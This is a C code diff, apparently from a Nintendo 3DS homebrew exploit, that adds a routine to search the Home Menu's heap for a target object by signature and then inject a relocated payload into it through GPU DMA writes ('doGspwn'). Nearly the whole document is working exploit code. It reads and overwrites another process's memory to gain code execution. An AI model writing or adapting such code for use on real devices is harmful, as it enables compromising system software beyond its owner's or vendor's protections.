@@ -519,6 +519,47 @@ void _aptExit()
 	_aptCloseSession();
 }
 
+void inject_payload(u32 target_address)
+{
+	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
+
+	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;
+
+	u32 target_base = target_address & ~0xFF;
+	u32 target_offset = target_address - target_base;
+
+	//read menu memory
+	{
+		_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x00001000);
+		
+		doGspwn((u32*)(target_base), (u32*)0x14100000, 0x00001000);
+	}
+
+	svc_sleepThread(10000000); //sleep long enough for memory to be read
+
+	//patch memdump and write it
+	{
+		u32* payload_src = (u32*)menu_payload_bin;
+		u32* payload_dst = &((u32*)0x14100000)[target_offset/4];
+
+		//patch in payload
+		int i;
+		for(i=0; i<menu_payload_bin_size/4; i++)
+		{
+			if(payload_src[i] < 0xBABE0000+0x100 && payload_src[i] > 0xBABE0000-0x100)
+			{
+				payload_dst[i] = payload_src[i] + target_address - 0xBABE0000;
+			}else if(payload_src[i] != 0xDEADCAFE) payload_dst[i] = payload_src[i];
+		}
+
+		_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x00001000);
+
+		doGspwn((u32*)0x14100000, (u32*)(target_base), 0x00001000);
+	}
+
+	svc_sleepThread(10000000); //sleep long enough for memory to be written
+}
+
 int main(u32 size, char** argv)
 {
 	int line=10;
@@ -539,23 +580,53 @@ int main(u32 size, char** argv)
 
 	// regionfour stuff
 
-	//want to overwrite 0x38a30118 with payload
+	drawTitleScreen("searching for target...");
 
-	//read menu memory
+	//search for target object in home menu's linear heap
+	// const u32 start_addr = 0x38000000;
+	// const u32 end_addr = 0x38F00000;
+	const u32 start_addr = 0x34000000;
+	const u32 end_addr = 0x35000000;
+	const block_size = 0x00010000;
+	const block_stride = block_size-0x100; // keep some overlap to make sure we don't miss anything
+
+	int cnt = 0;
+	u32 block_start;
+	u32 target_address = start_addr;
+	for(block_start=start_addr; block_start<end_addr; block_start+=block_stride)
 	{
-		_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x00001000);
-		
-		doGspwn((u32*)(0x38a30100), (u32*)0x14100000, 0x00001000);
-	}
+		//read menu memory
+		{
+			_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, block_size);
+			
+			doGspwn((u32*)(block_start), (u32*)0x14100000, block_size);
+		}
 
-	svc_sleepThread(100000000); //sleep long enough for memory to be read
+		svc_sleepThread(1000000); //sleep long enough for memory to be read
 
-	//patch memdump and write it
-	{
-		memcpy(&((u32*)0x14100000)[0x18/4], menu_payload_bin, menu_payload_bin_size);
-		_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x00001000);
+		int i;
+		u32 end = block_size/4-0x10;
+		for(i=0; i<end; i++)
+		{
+			const u32* adr = &((u32*)0x14100000)[i];
+			if(adr[2]==0x5544 && adr[3]==0x80 && adr[6]!=0x0 && adr[0x1F]==0x6E4C5F4E)break;
+		}
+		if(i<end)
+		{
+			drawTitleScreen("searching for target...\n    target locked ! engaging.");
 
-		doGspwn((u32*)0x14100000, (u32*)(0x38a30100), 0x00001000);
+			target_address = block_start + i * 4;
+
+			drawHex(target_address, 8, 50+cnt*10);
+			drawHex(((u32*)0x14100000)[i+6], 100, 50+cnt*10);
+			drawHex(((u32*)0x14100000)[i+0x1f], 200, 50+cnt*10);
+
+			inject_payload(target_address+0x18);
+
+			block_start = target_address + 0x10 - block_stride;
+			cnt++;
+			break;
+		}
 	}
 
 	svc_sleepThread(100000000); //sleep long enough for memory to be written
